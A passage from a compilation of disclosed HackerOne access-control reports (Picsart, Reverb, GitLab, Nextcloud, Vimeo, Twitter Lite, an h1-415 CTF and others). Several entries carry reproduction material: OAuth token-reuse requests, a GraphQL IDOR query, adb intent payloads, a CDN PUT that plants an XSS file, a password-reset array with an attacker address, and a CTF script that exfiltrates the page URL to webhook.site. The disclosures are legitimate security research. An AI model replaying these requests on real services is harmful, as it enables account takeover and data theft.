For the sharee, the checkbox "Hide Download" is therefore very deceptive, since they very likely weigh themselves in false safety.

## Impact

Download a copy of a file or folder that's not supposed to be downloaded whatsoever

---

### [User account compromised authentication bypass via oauth token impersonation](https://hackerone.com/reports/739321)

- **Report ID:** `739321`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Picsart
- **Reporter:** @amethasan
- **Bounty:** - usd
- **Disclosed:** 2020-03-20T08:31:36.302Z
- **CVE(s):** -

**Summary (team):**

OAuth token impersonation is actually a bug when 3rd party company app or malicious app collects the access token of the same user then that company can access to user account on PicsArt. The condition is that the user needs to authorized both PicsArt and malicious app with same Facebook or Google.

The Solution was to Validate that access_token belongs to PicsArt client_id via provider API.

---

### [Full account takeover](https://hackerone.com/reports/314808)

- **Report ID:** `314808`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Reverb.com
- **Reporter:** @sandeep_hodkasia
- **Bounty:** - usd
- **Disclosed:** 2020-03-19T15:26:51.759Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team,

I got a security issue in reverb ios application which allows an attacker hack all users account.
Since iOS application is not in the scope but still I am reporting this, because this vulnerability may compromise all users account.
Please resolve this quickly. 

Desription:
Reverb ios application is not validating facebook `access_token` on the server side in login api, which allows an  attacker to hack all account using his own app access token.

Vulnerable request:
```
POST /api/auth/facebook HTTP/1.1
Host: reverb.com

{"fb_token":"EAAJ8Of8DF2IBAL5wChKjuRHSV2VEWpm7eCz2IMqqJy1lJJq8ooyQuKHcOXn6aZCZAIrCtClbrZBdUGhC3FbvncNYk1E0k7AOktEhDjUPwHPOh3x29JURSGIGPBlZCj5WlBHhHzI5KYAPbuXKiZBGTkKZABZATh9JjTqEDhRubYSEiTmhjeytx5moFH9naZB6XjZBRUMkmcbucFD9Vf8IoFZAD1LGngi6j5pXFGcTFPfBEudAZDZD"}
```
Here in vulnerable i used lyst app access token to login.

Steps to reproduce:
1. Replay vulnerable request in vulnerable request in burp suite
2. Use any other app access token .

Fix recommendation:
https://developers.facebook.com/docs/facebook-login/security

**(Bug in oauth flow)

## Impact

Attacker Can hack all users account using his own app access token

---

### [HackerOne Pentesters can access any structured scope object through GraphQL node interface](https://hackerone.com/reports/781150)

- **Report ID:** `781150`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2020-03-11T22:38:35.968Z
- **CVE(s):** -

**Vulnerability Information:**

A missing authorization check in the `StructuredScope` protector class (`app/protectors/protected_structured_scope.rb:42`) enables any HackerOne Pentester to access structured scope objects of programs they aren't invited to or aren't running a penetration test through HackerOne. 

```ruby
class ProtectedStructuredScope
  # ...

  property(:CAN_INVITE_HACKERS) do
    StructuredScope.unscoped
      .joins(:team)
      .merge(Team.that_can_invite_hackers)
  end

  group(
    # ...
    (has_role(H1_PENTESTER) & has_feature(CAN_INVITE_HACKERS)),
  ) do
    allow :id
    allow :asset_identifier
    allow :asset_type
    allow :eligible_for_bounty
    allow :eligible_for_submission
    allow :instruction
    allow :rendered_instruction
    allow :availability_requirement
    allow :confidentiality_requirement
    allow :integrity_requirement
    allow :max_severity
    allow :archived_at
    allow :updated_at
    # ...
end
```

The `H1_PENTESTER` role is defined as:

```ruby
  scope :user_is_hackerone_pentester, ->(user) do
    verified.where(
      User.where(id: user).where.not(id: nil).where(User.arel_table[:h1_pentester].eq(true)).select(1).arel.exists,
    )
  end
```

The authorization logic should contain a check that determines whether the user has access to the structured scope through the `Pentest` object.

To reproduce, the following GraphQL query can be used:

```
query {
  node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x") {
    ... on StructuredScope {
      _id
      asset_identifier
      asset_type
    }
  }
}
```

Replace the node ID with any structured scope that belongs to a private program and it'll expose the attributes included in the protector.

## Impact

HackerOne Pentesters, although having more access than normal users, can obtain information from private programs that they don't have access to and aren't doing a penetration test through HackerOne.

---

### [[h1-415 2020] Spent a week and failed at solving the last step.](https://hackerone.com/reports/781265)

- **Report ID:** `781265`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @s1r1u5
- **Bounty:** - usd
- **Disclosed:** 2020-02-04T00:17:33.360Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

I found something interesting  with Headless chrome debugging in the last step, I am sure I am going to solve this after trying very hard for about a week, I don't know when this CTF is going to end, that's why I am submitting a summary of how to solve this so that I can write the full report after fully solving the final step.

1. ATO of jobert's account using jobert@mydocz.cosmic
2. CSP bypass using URL double encoding. `https://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js%22%3E%3C/script%3E`
3. IDOR to  update the name at review. ```http://localhost:3000/support/review/c9b46d365357148bcd2436bc5d7fc19f27268010e91cd271b6531f8dff6824dc```
4. Headless chrome debugging enabled (have to solve).

## Impact

.

---

### [[h1-415 2020] h1ctf{y3s_1m_c0sm1c_n0w}](https://hackerone.com/reports/781253)

- **Report ID:** `781253`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @pirateducky
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T20:48:00.906Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[add summary of the vulnerability]
Account takeover was possible because of the email validation used - `jobert@mydocz.cosmic<>{}` could be registered, but when the the system created the recovery `QR` code the extra symbols would get stripped leaving us with a valid recovery `QR` code to log into `jobert@mydocz.cosmic`. Once logged in we had access to the `support` bot (if you left a `1` star review, "someone" would come by and check our conversation) - here we realized we could inject markup however the CSP policy was pretty strict, the only outside script allowed to run needed to come from `https://github.com/mattboldt/typed.js/master/lib/` we found that we could append a github repo to this url and execute it's content `https://github.com/mattboldt/typed.js/master/lib/@https://github.com/username/repo_name/master/filename.js` you have to remove `/blob/` from the repo url.  Once we had execution we tried to exfiltrate `cookies` and anything we could think of, include `window.location.href` which gives you the current url the user is visiting, we did is using a script that looked like
```js
var image = document.createElement("img")
var image.src = "webhook.site/1234/img.png?url= + window.location.href
document.body.appendChild(image)
``` 
This allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd` 
Once you had access to the form in the reviews there's a form the reviewer has access to, to edit the user's name, this parameter was vulnerable to an IDOR - so you could edit anyone's name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf's the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let's make a request to our server so we can get more information about what's creating these pdfs, here I used https://ssrftest.com to test for SSRF - there's a payload to use an image and try to get a request back to the server - it works and the header's that are important to us here are `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36` it tells us this is a headless browser Chrome running on linux, there's also a `Referer: http://localhost:3000/` so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an `iframe` to "peek" inside the application, trying ports, `80` returned `FORBIDDEN` and everything else we tried was blank, and then I remembered this was using `headless Chrome` so I used my google-fu and searched for `headless chrome port number` and the results were promising: 
```
chrome \
  --headless \                   # Runs Chrome in headless mode.
  --disable-gpu \                # Temporarily needed if running on Windows.
  --remote-debugging-port=9222 \
  https://www.chromestatus.com   # URL to open. Defaults to about:blank.
```

We used that port number like so: `<iframe src='http://localhost:9222 width=900 height=900></iframe>` this gave us back: 

`Inspectable WebContents`  :( 

but then we tried: `<iframe src='http://localhost:9222/json width=900 height=900></iframe>` and....

we receive a json document with the important part being
```
secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88"```

if you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf

It is done! 

Thank you Hacker1 for hosting this event, I participated with 2 other awesome friends from the hacker101 discord @checkm50 & @ Al-MadjusT who without I would not have been able to finish it - we did it and took us every moment of it, but we did it. And it feels awesome! 

This write up is last minute and it sucks, next time I'll write a better one, this one was all about getting it done.

Again thank you!

## Impact

We finished it.

We got to take over an account and compromise the internal network to retrieve the secret document.

**Summary (researcher):**

Account take over => CSP bypass to execute javascript => IDOR => Access to internal network => access to debugging on headless Chrome.

---

### [[h1-415 2020] I got the flag](https://hackerone.com/reports/777099)

- **Report ID:** `777099`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @jllis
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T20:44:21.100Z
- **CVE(s):** -

**Vulnerability Information:**

Hey guys,

The flag is: `h1ctf{y3s_1m_c0sm1c_n0w}`

I'll submit a well written writeup later today or tomorrow. I now have a lot of work to catch up thanks to this devilish ctf hehehe.

Thanks Ben and the rest of the team for this awesome challenge.

## Impact

Getting the flag

---

### [Lack or Origin check leads to Cross-Site Websocket Hijacking (CSWSH)](https://hackerone.com/reports/535436)

- **Report ID:** `535436`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Superhuman (formerly Grammarly)
- **Reporter:** @fisher
- **Bounty:** 800 usd
- **Disclosed:** 2020-01-04T00:48:46.320Z
- **CVE(s):** -

**Summary (team):**

# Summary

@fisher discovered a CSRF-related vulnerability in Coda docs by which an attacked could craft a convincing page that would make modifications to a specific document without the victim knowing. This is due to the inherent nature of Websockets not being secure by default. Although a fully-working proof of concept was not provided, the Coda security team swiftly patched the vulnerability and rewarded a bounty for the creative attack.

# Original Report from Researcher

## Summary:

It was discovered that when opening a WebSocket channel the Origin header is not checked by the server, leaving the application exposed to a Cross-Site Websocket Hijacking attack (CSWSH).

## Background

The problem was first dubbed by Christian Schneider in his blog. Because WebSockets are not restricted by the browser's Same Origin Policy (SOP), if no defensive mechanisms are in place, an attacker can initiate a WebSocket communication from a malicious page targeting the vulnerable wss endpoint - ending up with the ability to communicate two-way with the server.

The most common defensive mechanisms are:

- Checking the Origin header in the first/handshake request (where the Cookie is sent), before issuing a 101 Switching Protocols
- Sending a CSRF token in every WS message


## Steps To Reproduce:

We can check this very easily by using a custom extension e.g. Simple Websocket Client

1. After installing an extension like the above, login in https://coda.io and open or create a new document while proxying requests through Burp
2. Burp has a WebSocket history under Proxy, next to HTTP History. Select any of the URL's used, e.g: https://coda.io/documentsCollab/<docId>/collab/?params=PARAMS&connectionId=CONNECTIONID&EIO=3&transport=websocket
3. Open the extension and use this URL(substitute https for wss) and press open:Immediately we connect and receive a message from the server, which confirms the lack of Origin check.
Although the URL might first look like undecipherable to an attacker, the params parameter just holds a base64 value of the document ID:
{"documentId":"DOCID"}

Since the document ID is sufficiently long, an attack scenario is:

- User (admin) invites attacker to collaborate on a document (view only)
- Attacker now knows the document ID. He prepares a CSWSH payload and embeds it in a malicious webpage and sends the link to the victim
- Victim opens the malicious page and is Cross Site Websocket Hijacked. The payload could e.g. delete or alter the contents of the document, introducing fake content

## Impact

The most serious impact scenario is the attacker forcing the victim to do any operation available within the WebSockets communication (basically a CSRF). He can also read sensitive information (since the WS communication is full duplex).

---

### [Group search leaks private MRs, code, commits](https://hackerone.com/reports/692252)

- **Report ID:** `692252`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @rpadovani
- **Bounty:** - usd
- **Disclosed:** 2019-12-14T11:25:59.717Z
- **CVE(s):** CVE-2019-5487

**Vulnerability Information:**

### Summary

Using the group search you can access MRs and code set as "not public" in a project

### Steps to reproduce

Create a public group, create a public project inside the group, but with private code.
Push some code, search in the **group search** the code while logged out, you will find it also if it should be private.

I provide some working links in the example section.

### Impact

An attacker can extract all the private code, private MRs, private commits from a project

### Examples

I am going to use customers.gitlab.com examples because it is how I actually found the problem - the search I have done are about a Hackerone report I first published. I haven't saved any data, nor screenshot of what I have found, apart from the one attached

1. Go to https://gitlab.com/gitlab-org in a private window
2. In the top right bar, insert `Resolve "Account takeover due to IDOR on customers.gitlab.com [applicable for gitlab users only]"`
3. Select "Merge requests"
4. You see in the search result a MR that should be private, since the `customer-gitlab-com` project has no public code/MR
5. Link: https://gitlab.com/search?group_id=9970&project_id=&repository_ref=&scope=merge_requests&search=Resolve+%22Account+takeover+due+to+IDOR+on+customers.gitlab.com+%5Bapplicable+for+gitlab+users+only%5D%22

You can do the same thing for the code:
1. Go to https://gitlab.com/gitlab-org in a private window
2. In the top right bar, insert `In order to create an account for the [admin panel]`
3. Select "Code"
4. You see a piece of the README of customers.gitlab.com, which has a private code
5. Link:  https://gitlab.com/search?group_id=9970&repository_ref=&scope=blobs&search=In+order+to+create+an+account+for+the+%5Badmin+panel%5D&snippets=#

In the case of MRs, you can use also the wildcard symbol and filter by project, to extract all the private MRs:

https://gitlab.com/search?utf8=%E2%9C%93&snippets=&scope=merge_requests&repository_ref=&search=*&group_id=9970&project_id=2670515

When you filter by project, the code search stops to work, so if you want to extract all the code you have to apply custom search, but it is still feasible.

You got the point, we have also commits:
- https://gitlab.com/search?utf8=%E2%9C%93&snippets=&scope=commits&repository_ref=&search=Merge+branch+%27433-idor-fix%27+into+%27staging%27&group_id=9970

Issues are not affected by this bug

### What is the current *bug* behavior?

Leak of MRs overview, code, commits, and I suspect also wiki, but for some reason group search of wiki didn't work on my personal group, and I didn't want to look over other gitlab-org data

### What is the expected *correct* behavior?

No search result

### Relevant logs and/or screenshots

A MR of customers.gitlab.com I shouldn't have access to. Notice how I am not logged in in this screenshot

### Output of checks

This bug happens on GitLab.com

## Impact

An attacker can extract all the private code, private MRs, private commits from a project

---

### [Group search with Elastic search enable leaks unrelated data](https://hackerone.com/reports/708820)

- **Report ID:** `708820`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @rpadovani
- **Bounty:** - usd
- **Disclosed:** 2019-12-14T11:25:39.733Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

Performing a group search when Elastic Search is enabled provides access to unrelated merge requests, issues activity, leaking the existence of private groups, plus their activity and MRs.
This happens both on the GUI and with the APIs 

### Steps to reproduce

Let's take this search on the Gitlab group: https://gitlab.com/search?utf8=%E2%9C%93&snippets=&scope=merge_requests&repository_ref=&search=%21435&group_id=9970

If you go at the end of the page, you see 5 MRs from other groups that should be private - I have no idea what are those projects - I have no relation to them, and I have no access to the group they belong to! (See attached screenshot).

A lot more data can be retrieved through the APIs, now revealing existence of groups/projects I shouldn't know they exist!

I haven't fully understand the logic of the issue, but basically every combination of ! followed by numbers (I had hits with !709, !999) leaks MRs from other groups.

While on the UI doesn't show much info, the APIs retrieve a lot of data.

It also leaks private activity on public issues.

If you search for `nextbit`, [link](https://gitlab.com/search?utf8=%E2%9C%93&snippets=&scope=notes&repository_ref=&search=nextbit&group_id=9970), you see that my main account has linked a private issue to a public issue. The activity should be private, and indeed it is not reported inside the issue itself, but it is reported in the search.

### Impact

Leaking existence of private groups, private issues activity, private MRs, with lot of metadata

## Impact

Leak of private MRs with metadata, activity of private issues, leak existence of private groups

---

### [Examples directory is PUBLIC on https://████████mil, leading to multiple vulns](https://hackerone.com/reports/674741)

- **Report ID:** `674741`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @masonhck357
- **Bounty:** - usd
- **Disclosed:** 2019-10-10T19:11:41.367Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hello, 

In an effort to consolidate reporting. I have located 4 issues with having the Examples Directory open(my require just 1 solution to mitigate) The following URLs that show concern are the following:

1. https://█████mil/examples/servlets/servlet/SessionExample <--Will lead to Session Manipulation and potential Account Takeover

2. https://██████mil/examples/servlets/servlet/RequestHeaderExample <---Internal IP disclosure

3. https://██████████mil/examples/servlets/ <---Source Code Disclosure and an "Execute" option(did not press Execute button so I am not sure the impact of it.

4. https://████mil/examples/servlets/servlet/CookieExample <----Insecure Cookie Handling



## Step-by-step Reproduction Instructions

1. Please visit the above links
2.
3.


## Suggested Mitigation/Remediation Actions

Disable public access to the examples directory as soon as possible!

## Impact

Ordered by Highest Impact:

1. https://██████mil/examples/servlets/servlet/SessionExample <--Will lead to Session Manipulation and potential Account Takeover. Because the session is global this servlet poses a big security risk as an attacker can potentially become an administrator by manipulating its session.

2. https://██████████mil/examples/servlets/servlet/CookieExample <----Insecure Cookie Handling

3. https://███████mil/examples/servlets/ <---Source Code Disclosure and an "Execute" option

4. https://██████mil/examples/servlets/servlet/RequestHeaderExample <---Internal IP disclosure

---

### [Periscope-all Firebase database takeover](https://hackerone.com/reports/684099)

- **Report ID:** `684099`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** X / xAI
- **Reporter:** @deeptiman
- **Bounty:** - usd
- **Disclosed:** 2019-09-25T22:01:29.016Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

I found one public Firebase database of periscope.tv and I can able to insert data to this database and i only used it once for the testing purposes, so other database queries also possible.

Please follow the below link to check the inserted test data.

###Periscope-all Firebase URL :- 

https://█████████/.json

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if periscope uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the Periscope.

So please immediately change the rule of the database to private so that nobody can able to access it outside.

Thanks
Deeptiman Pattnaik

---

### [Subdomain takeover on healthyhackathon.khanacademy.org and hackweek.khanacademy.org](https://hackerone.com/reports/474798)

- **Report ID:** `474798`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Khan Academy
- **Reporter:** @katsuragicsl
- **Bounty:** - usd
- **Disclosed:** 2019-08-25T07:02:41.660Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary :
healthyhackathon.khanacademy.org can be took over, since it points to a bucket in S3 but that bucket does not exists.

I know this domain is used to host information of healthyhackathon which is held by khanacademy, but you will not be able to do this anymore if someone is going to claim that bucket. 

#Reference :
[S3_takeover](https://github.com/EdOverflow/can-i-take-over-xyz/issues/36)

## Impact

Taking control of healthyhackathon.khanacademy.org and spoof khanacademy users that healthyhackathon is reopened/"archived for you to challenge" and collect their information.

---

### [In Dockerized Environments, Failing to Read config.php Grants Any Anonymous User Full Admin Access](https://hackerone.com/reports/522876)

- **Report ID:** `522876`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @theguynamedguy86
- **Bounty:** - usd
- **Disclosed:** 2019-07-27T10:42:10.149Z
- **CVE(s):** -

**Vulnerability Information:**

Consider this deployment:
- Nextcloud is already installed in a Dockerized environment.
- There are two Nextcloud containers running in the environment.
- Both containers share the same MySQL database.
- Both containers share the same data (`/var/www/html/data`) and config (`/var/www/html/config`) via NFS-mounted or SMB-mounted Docker volumes.
- All of the values Nextcloud needs to complete first-run setup (database name and credentials, admin credentials, etc) are provided to both containers via environment variables (`NEXTCLOUD_ADMIN_USER`, `NEXTCLOUD_ADMIN_PASSWORD`, `MYSQL_HOST`, `MYSQL_DATABASE`, `MYSQL_USER`, `MYSQL_PASSWORD`).

Now, consider that one or both of the containers encounter an issue reading `/var/www/html/config/config.php`. This could be caused by an of the following:
- Transient failure connecting to the NFS/SMB server at the time either container is launching or restarting (especially in response to a failed Liveness check).
- Timeout or other transient failure in communication with the NFS/SMB server while the container is already running.
- One container attempting to read `config.php` while the other container is writing to the file, causing an incomplete read (possibly making the file look empty).

In this situation, Nextcloud will assume that it is NOT installed (since the config seems empty). As a result, Nextcloud will launch the installer the next time ANY user requests a page from _the container that temporarily cannot read the `config.php` file_.  This causes that instance of Nextcloud to overwrite the `config.php` with a new file that has the same database credentials as the old file (populating the credentials from the environment variables), but the new config flags Nextcloud as not yet being installed (i.e. `installed` is set to `FALSE`). Some time later, assuming that NFS/SMB services have been restored to normal (e.g. the transient issue has disappeared), ALL containers will now happily serve up the Nextcloud installer to ANY user because the container that failed to read the configuration file wrote a new one with a newer timestamp that indicates Nextcloud is not installed.

From here, ANY user who stumbles upon the installer page can provide ANY username and password and end up with a new admin account with full access to the existing Nextcloud installation.

Nextcloud should NOT allow the installer to be run if ANY database tables already exist in the target database. If this is not possible, Nextcloud should at least not allow the installer to be run if any `admin` users exist in the target database.

## Impact

An attacker interested in taking over an existing installation of Nextcloud could write a script to frequently monitor that installation until such a time as that installation suffers a temporary issue reading `config.php` and starts serving up the installer. At that point, the attacker can hop over to the installation, finish the setup process, and create a username and password of their choice to gain full admin access to the entire Nextcloud installation.

With admin access, the attacker can lock out all of the existing users of the system, change system settings, and download or erase all of the files on the Nextcloud installation.

---

### [Add users to groups who have restricted group invites](https://hackerone.com/reports/538008)

- **Report ID:** `538008`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** WordPress
- **Reporter:** @yuvraj_dighe
- **Bounty:** - usd
- **Disclosed:** 2019-07-27T09:22:18.600Z
- **CVE(s):** -

**Vulnerability Information:**

#Description:

WordPress version: 5.2
BuddyPress version: 4.2.0

Through this vulnerability, an attacker could add users to groups who have set :
   `I want to restrict Group invites to my friends only.`

There is no proper validation of the personal settings of the user and thus the users with such privacy settings selected could be added.

#Steps to Reproduce:

Make 2 accounts A and B, make sure they are not friends.

  1. From account of user A, enable the setting `I want to restrict Group invites to my friends only.` from the following URL http://bbwordpress.esy.es/members/yuvraj/settings/invites/.
  2. From account of user B, make a POST request to : 

      `POST : http://bbwordpress.esy.es/wp-admin/admin-ajax.php`
       `BODY : message=&nonce=21f500cbfd&group_id=1&action=groups_send_group_invites&_wpnonce=7264177f51&users%5B%5D=3`

  3. Replace the value of users with the victims user id , i.e id of user A.
  4. Victim (user A) would receive an invitation from Attacker (user B) even though the privacy setting to restrict group invites has been enabled.

## Impact

An attacker who is not a friend of the victim can send him a group invite even though the victim has selected to restrict group invites from friends only.

---

### [Possibility to overwrite any file in the vpe.cdn.vimeo.tv leads to the Stored XSS for the all customers on the embed.vhx.tv](https://hackerone.com/reports/452559)

- **Report ID:** `452559`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Vimeo
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2019-07-10T19:12:30.179Z
- **CVE(s):** -

**Summary (team):**

By modifying the Content-Type to be blank, during a PUT command, the researcher was able to upload files to the CDN. This has been resolved.

**Summary (researcher):**

It was possible to write (and overwrite) arbitrary files to the CDN ( `vpe.cdn.vimeo.tv` ) used for JS scripts delivery on the various in-scope assets using the PUT method with blank or application/octet-stream Content-Type. Any other Content-Type caused auth error from Google Cloud Storage side.
Example:
```
PUT /something.js HTTP/1.1
Host: vpe.cdn.vimeo.tv
Content-Type: application/octet-stream
Content-Length: 10
Connection: close

alert(document.domain)
```
could create `something.js` with XSS payload or overwrite `something.js` if it already exist.

The issue was fixed fast. Thanks to the VHX team for the great experience, awesome communication and the bounty!

---

### [Attacker is able to access commit title and team member comments which are supposed to be private](https://hackerone.com/reports/502593)

- **Report ID:** `502593`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitLab
- **Reporter:** @yashrs
- **Bounty:** - usd
- **Disclosed:** 2019-07-03T17:05:17.620Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** [add summary of the vulnerability]

**Description:** [add more details about this vulnerability]

## Steps To Reproduce:

To reproduce this vulnerability, we need two accounts, lets say those accounts are:
-> victim@gmail.com
-> attacker@gmail.com

- Create a project from account victim@gmail.com with the following permissions:
{F432203}
Note that the project visibility should be `internal`.

- Go to profile of `victim@gmail.com` from `attacker@gmail.com`  and subscribe to all events, like this:
{F432204}

- From victim account, comment on any commit, and you should receive it's notification on attacker@gmail.com, like this:
{F432207}

As you can see, the message of the commit, team members who commented, what the comment was, everything is visible from the email received. This shouldn't be sent via email because the settings selected for repository is 'Only Team Members' whereas attacker@gmail.com is not a team member.

I have tried my best to have perfect steps to reproduce this, still do tell me if you need more info :)

Thanks,
Yash :)

## Impact

An attacker will be able to view any commit titles, and all comments which shouldn't be visible to him using this vulnerability

---

### [Expired reshare links allow access to all files in share](https://hackerone.com/reports/452854)

- **Report ID:** `452854`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @frr
- **Bounty:** - usd
- **Disclosed:** 2019-06-27T14:00:09.034Z
- **CVE(s):** CVE-2020-8121

**Summary (team):**

After a reshared subfolder link has expired, the link allows access to the full folder.

I found the Problem in Nextcloud 14.0.3, but it still persists in 14.0.4
Steps:

1.  share folder "A" with an nextcloud group
2. reshare a subfolder "B" of this folder with another user on this group (in this case the user both have group admin) as public link.
3. set an expiry date
4. let date expire
5. open link Expected result: You see a message that the link has expired Actual result: You have access to the initial shared folder "A"

Impact

After getting a reshared link for a subfolder with expiry date (legitimately or through social engineering) the attacker just has to wait for expiry for full access to all Files in the share.

---

### [Broken access control on apps ](https://hackerone.com/reports/491892)

- **Report ID:** `491892`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Rocket.Chat
- **Reporter:** @theappsec
- **Bounty:** - usd
- **Disclosed:** 2019-06-22T08:41:48.343Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 

The user without administrative privileges can upload and install any Application into the rocket.chat
As ID of application is controlled in the app.json file (which is controlled by uploader) user can also activate the app.

## Releases Affected:

  * 0.73.2

## Steps To Reproduce:
- User log-in into the chat
- User open the following link:

```
http://<rocket-chat.link>>/admin/app/install
```
- Upload any app
- Activate it by send the following POST request to the installed app:

```http
POST /api/apps/<ID_of_the_installed_App>/status HTTP/1.1
Host: rocket-chat.link
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-User-Id: [redacted]
X-Auth-Token: [redacted]
X-Requested-With: XMLHttpRequest
Cookie: [redacted]
DNT: 1
Connection: close
Content-Length: 29

{"status":"manually_enabled"}
```

## Supporting Material/References:

You can see the uploading process in the attached video. Left user is admin, right -  user without any additional privileges. 

## Suggested mitigation
Managing apps should be available to admins only.

## Impact

Users can install and activate malicious apps into the rocket.chat.

---

### [CORS Misconfiguration leading to Private Information Disclosure](https://hackerone.com/reports/430249)

- **Report ID:** `430249`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @sandh0t
- **Bounty:** - usd
- **Disclosed:** 2019-06-07T12:01:11.976Z
- **CVE(s):** -

**Summary (team):**

Due to mistake on te CORS policy configuration, the sites https://client.amplifi.com and https://protect.ubnt.com/ CORS policy allowed HTTP requests to be made from certain sites outside the `*.ubnt.com` and `*.ui.com` domains.

This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page.

---

### [Ability to reset password for account](https://hackerone.com/reports/322985)

- **Report ID:** `322985`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Upserve 
- **Reporter:** @exadmin
- **Bounty:** - usd
- **Disclosed:** 2019-06-06T20:30:51.726Z
- **CVE(s):** -

**Summary (team):**

The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address. 

POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}

---

### [ISteamAssets gives partners control over unrelated community market transactions](https://hackerone.com/reports/577584)

- **Report ID:** `577584`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2019-05-23T22:17:37.213Z
- **CVE(s):** -

**Summary (team):**

ISteamAssets APIs would check that the key parameter used was a partner key with access to the appid specified, but then would ignore the passed in appid and would operate on app 753 regardless. This allowed anyone with a partner key to make changes to Steam economy items, like trading cards, and also could be used to reverse wallet fund spending on the Steam Community Market.

---

### [Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect ](https://hackerone.com/reports/499348)

- **Report ID:** `499348`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** X / xAI
- **Reporter:** @rahulkankrale
- **Bounty:** - usd
- **Disclosed:** 2019-04-29T16:17:02.180Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** com.twitter.android.lite.TwitterLiteActivity is set to exported and doesn't validate data pass to intent due to which this activity vulnerable to steal users local files, javascript injection and open redirect.

**Description:** com.twitter.android.lite.TwitterLiteActivity is set to exported so external app can communicate with it.
As this activity doesn't validate data pass through intent critical uri like javascript and file so malicious app can steal users files as well as inject javascript.
It can leads to many issue like UXSS, Token steal, etc.

## Steps To Reproduce:

  1. To reproduce we use ADB tool

  2. To reproduce local file access use: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"

  3. To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"

  4. To reproduce open redirect: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"

 * Video of POC attached.

Thanks

## Impact

As critical uri like javascript & file is not being validate malicious app can steal users session token, users files etc.

---

### [Unauthorized access of Monero wallet by an unprivileged process](https://hackerone.com/reports/462442)

- **Report ID:** `462442`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Monero
